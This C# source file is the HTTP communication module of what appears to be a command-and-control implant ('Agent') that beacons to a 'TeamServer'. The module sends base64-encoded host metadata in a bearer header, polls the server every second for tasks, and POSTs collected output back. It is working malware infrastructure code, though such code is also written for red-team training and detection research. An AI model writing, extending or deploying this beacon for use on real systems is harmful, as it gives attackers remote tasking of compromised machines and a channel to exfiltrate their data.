using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Models
{
    public class HttpCommModule : CommModule
    {
        public string ConnectAddress { get; set; }
        public int ConnectPort { get; set; }

        private CancellationTokenSource _tokenSource;
        private HttpClient _client;
        // Declaring the class
        // Constructor to initialize the module with the connection address and port.
        public HttpCommModule(string connectAddress, int connectPort)
        {
            ConnectAddress = connectAddress;
            ConnectPort = connectPort;
        }
        // Initializes the HTTP client and sets the base address for connecting with the TeamServer.
        public override void Init(AgentMetadata metadata)
        {
            base.Init(metadata);

            _client = new HttpClient();
            _client.BaseAddress = new Uri($"http://{ConnectAddress}:{ConnectPort}");
            _client.DefaultRequestHeaders.Clear();

            // Encodes the agent metadata and adds it to the authorization header.
            var encodedMetadata = Convert.ToBase64String(AgentMetadata.Serialize());
            _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
        }

        // Starts the communication module, periodically CheckingIn (HTTP GET) or PostingData (HTTP POST)
        public override async Task Start()
        {
            _tokenSource = new CancellationTokenSource();

            // Continues running until a cancel request
            while (!_tokenSource.IsCancellationRequested)
            {
                //check to see if we have data to send
                if (!Outbound.IsEmpty)
                {
                    await PostData();
                }
                else
                {
                    await CheckIn();
                }

                await Task.Delay(1000);

                // checkin
                // get tasks
                // sleep
            }
        }

        // HTTP GET
        // HANDLE RESPONSE
        private async Task CheckIn()
        {
            var response = await _client.GetByteArrayAsync("/");
            HandleResponse(response);
        }

        /// <summary>
        /// Asynchronously sends serialized outbound data to the server via an HTTP POST request.
        /// The data is serialized into a JSON byte array using the Serialize extension method.
        /// The byte array is then converted into a UTF-8 encoded string and wrapped in a (StringContent : HttpContent) object.
        /// The HTTP POST request is sent to the server, and the response is read as a byte array.
        /// </summary>
        private async Task PostData()
        {
            var outbound = GetOutbound().Serialize();
            var content = new StringContent(Encoding.UTF8.GetString(outbound), Encoding.UTF8, "application/json");
            var response = await _client.PostAsync("/", content);
            var responseContent = await response.Content.ReadAsByteArrayAsync();

            HandleResponse(responseContent);
        }

        private void HandleResponse(byte[] response)
        {
            var tasks = response.Deserialize<AgentTask[]>();

            if (tasks != null && tasks.Any())
            {
                foreach (var task in tasks)
                {
                    Inbound.Enqueue(task);
                }
            }
        }
        public override void Stop()
        {
            _tokenSource.Cancel();
        }
    }
}
